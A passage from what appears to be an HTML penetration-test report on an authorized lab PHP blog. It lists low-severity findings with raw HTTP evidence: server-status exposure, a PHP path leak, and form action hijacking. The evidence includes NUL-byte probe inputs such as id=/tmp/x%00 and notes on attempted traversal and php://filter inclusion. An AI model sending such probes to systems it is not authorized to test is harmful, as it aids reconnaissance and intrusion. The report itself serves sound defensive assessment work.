+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxp9ilx-e</code> — <code>artifacts/s-0002/ev-mqxp9ilx-e/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+accept: text/html</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 7636
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:22:49 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [misconfig] Apache mod_status endpoint exposed (restricted but reachable)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="desc">The Apache mod_status endpoint at /server-status returns 403 (Forbidden) rather than 404 (Not Found), confirming the module is loaded and the handler is registered. Absent resources return 404; the 403 proves this path is configured. A hardened production server should not have mod_status reachable from external clients at all — if an access-control misconfiguration is later introduced, real-time worker/request telemetry would be exposed to attackers. Additionally, the 403 error page (and all Apache error pages) also disclose the server version (see f-001).</div>
+<div><b>Reproduction</b></div><pre>1. GET /nonexistent-path → 404 (resource does not exist)\n2. GET /server-status → 403 (resource exists, access denied)\n3. The 403 vs 404 distinction confirms mod_status is enabled and the endpoint is configured on the server.\n4. Disable mod_status or restrict the handler to localhost-only via &amp;lt;Location /server-status&amp;gt; Require local &amp;lt;/Location&amp;gt;.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxpcryh-g</code> — <code>artifacts/s-0002/ev-mqxpcryh-g/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-path-xyzzy123 HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 11:25:21 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxp9hoy-d</code> — <code>artifacts/s-0002/ev-mqxp9hoy-d/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 11:22:47 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxpacr2-f</code> — <code>artifacts/s-0002/ev-mqxpacr2-f/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 11:23:28 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 6. [info-disclosure] Verbose PHP error on /post.php discloses absolute server path and include logic (display_errors enabled)</h3>
+<div class="kv">Screen: <code>s-0004</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="desc">post.php builds an include path from the `id` parameter (`include(&quot;posts/&quot;.$id.&quot;.php&quot;)` based on observed behaviour) and runs file_exists() on it at line 13. Supplying a value containing a NUL byte (e.g. id=/tmp/x%00) makes file_exists() emit a PHP Warning that is rendered directly into the response because display_errors is enabled in production: &quot;Warning: file_exists() expects parameter 1 to be a valid path, string given in /var/www/html/post.php on line 13&quot;. This discloses the application's absolute filesystem path (/var/www/html/), the vulnerable function and exact line, and confirms the page does dynamic file inclusion — all useful reconnaissance for an attacker. The underlying inclusion itself is hardened (a &quot;../&quot;-substring filter blocks traversal, the posts/ prefix blocks absolute paths, the .php suffix and file_exists()'s rejection of stream wrappers block php://filter, and modern PHP rejects the NUL byte), so arbitrary file read was NOT achievable — the issue here is the verbose error/path leak, not a working LFI.</div>
+<div><b>Reproduction</b></div><pre>1) Baseline/negative control: GET /post.php?id=this-post-does-not-exist-9999 → 200, 22 bytes, body &quot;&lt;p&gt;Post not found.&lt;/p&gt;&quot; with NO PHP warning. 2) GET /post.php?id=/tmp/x%00 → 200, 170 bytes, body begins &quot;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: file_exists() expects parameter 1 to be a valid path, string given in &lt;b&gt;/var/www/html/post.php&lt;/b&gt; on line &lt;b&gt;13&lt;/b&gt;&quot;. 3) Repeat with id=/var/y%00 → identical warning, stable. The warning text reveals the absolute path /var/www/html/post.php and the file_exists() call site.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxpgnve-z</code> — <code>artifacts/s-0004/ev-mqxpgnve-z/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php?id=this-post-does-not-exist-9999 HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 22
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:28:22 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+x-powered-by: PHP/7.4.33
+
+&lt;p&gt;Post not found.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxppyuk-1s</code> — <code>artifacts/s-0004/ev-mqxppyuk-1s/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php?id=/tmp/x%00 HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 170
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:35:36 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  file_exists() expects parameter 1 to be a valid path, string given in &lt;b&gt;/var/www/html/post.php&lt;/b&gt; on line &lt;b&gt;13&lt;/b&gt;&lt;br /&gt;
+&lt;p&gt;Post not found.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxppzh7-1t</code> — <code>artifacts/s-0004/ev-mqxppzh7-1t/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php?id=/var/y%00 HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 170
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:35:37 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  file_exists() expects parameter 1 to be a valid path, string given in &lt;b&gt;/var/www/html/post.php&lt;/b&gt; on line &lt;b&gt;13&lt;/b&gt;&lt;br /&gt;
+&lt;p&gt;Post not found.&lt;/p&gt;</pre></div>
+</div>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 7. [burp] Form action hijacking (reflected) (2 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The name of an arbitrarily supplied URL parameter is copied into the response within the  path of a form action URL.&lt;br&gt;&lt;br&gt; The payload &lt;b&gt;8xst2g0x6k&lt;/b&gt; was submitted in the name of an arbitrarily supplied URL parameter. This input was echoed unmodified within a form action URL.&lt;br&gt;&lt;br&gt;This proof-of-concept attack demonstrates that it is possible to modify the form action to reference an arbitrary path. (confidence: FIRM) [+1 more URL(s): http://target.local:32807/contact.php] @ http://target.local:32807/posts/upload-article.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqqpbe-5x</code> — <code>artifacts/_/ev-mqxqqpbe-5x/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/upload-article.php HTTP/1.1
+Host: target.local:32807
+
+GET /posts/upload-article.php/8xst2g0x6k HTTP/1.1
+Host: target.local:32807
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 12:02:35 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 6582
+Content-Type: text/html; charset=UTF-8
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | Article Submission&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
